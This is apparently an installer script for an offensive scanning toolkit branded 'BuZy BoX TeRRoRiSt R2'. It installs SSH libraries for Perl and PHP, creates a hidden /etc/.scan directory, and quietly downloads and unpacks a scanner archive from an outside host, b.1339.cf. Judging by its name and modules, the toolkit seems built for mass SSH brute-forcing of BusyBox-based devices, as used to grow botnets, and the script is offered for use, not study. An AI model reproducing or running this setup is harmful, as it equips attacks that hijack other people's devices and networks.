#!/bin/bash
echo '\x1b[1;35m'###########################################################################
echo '                                                                                \r\n'#
echo ' ███████   ███  ███  ████████  ███ ███  ███████    ██████   ███  ███            \r\n'#
echo ' ████████  ███  ███  ████████  ███ ███  ████████  ████████  ███  ███            \r\n'#
echo ' ██▒  ███  ██▒  ███       ██▒  ██▒ ▒██  ██▒  ███  ██▒  ███  ██▒  ▒██            \r\n'#
echo ' ▒█   █▒█  ▒█▒  █▒█      ▒█▒   ▒█▒ █▒▒  ▒█   █▒█  ▒█▒  █▒█  ▒█▒  █▒▒            \r\n'#
echo ' █▒█▒█▒█   █▒█  ▒█▒     █▒▒     ▒█▒█▒   █▒█▒█▒█   █▒█  ▒█▒   ▒██▒█▒             \r\n'#
echo ' ▒▒▒█▒▒▒▒  ▒█▒  ▒▒▒    ▒▒▒       █▒▒▒   ▒▒▒█▒▒▒▒  ▒█▒  ▒▒▒    █▒▒▒              \r\n'#
echo ' ▒▒░  ▒▒▒  ▒▒░  ▒▒▒   ▒▒░        ▒▒░    ▒▒░  ▒▒▒  ▒▒░  ▒▒▒   ▒░ ░▒▒             \r\n'#
echo ' ░▒░  ▒░▒  ░▒░  ▒░▒  ░▒░         ░▒░    ░▒░  ▒░▒  ░▒░  ▒░▒  ░▒░  ▒░▒            \r\n'#
echo ' ░░░ ░░░░  ░░░░░ ░░   ░░ ░░░░     ░░     ░░ ░░░░  ░░░░░ ░░   ░░  ░░░            \r\n'#
echo ' ░░░ ░ ░░    ░ ░  ░   ░ ░░ ░ ░     ░     ░░ ░ ░░    ░ ░  ░    ░   ░░            \r\n'#
echo '                     ~[ BuZy BoX TeRRoRiSt R2 ]~                                \r\n'#
echo '\x1b[0m'##############################################################################

#########################################
###############WGETS#####################
#########################################
$wgetscan='http://b.1339.cf/qooglfw.zip'

#########################################
######Installing mods for scanning#######
#########################################
echo -e "\e[0;31mInstalling dependencies for scanning"
sleep 3
echo -e "\e[0;31mFinishing up install...."
yum install cpan wget curl glibc.i686 -y
cpan force install Parallel::ForkManager
cpan force install IO::Socket
cpan force install IO::Select
sleep 2
yum install gcc php-devel php-pear libssh2 libssh2-devel
pecl install -f ssh2
touch /etc/php.d/ssh2.ini
echo extension=ssh2.so > /etc/php.d/ssh2.ini
cpan force install Net::SSH2

#########################################
###############DICKS#####################
#########################################
echo -e "\e[0;31mScanner can be found in /etc/.scan"
sleep 2
mkdir /etc/.scan
cd /etc/.scan
wget --quiet $wgetscan -O scan.zip; unzip scan.zip

#########################################
###############Credz#####################
#########################################
echo -e "\e[0;31mMade by XORA, XMPP: X@miku.li ; Skype: icingcups"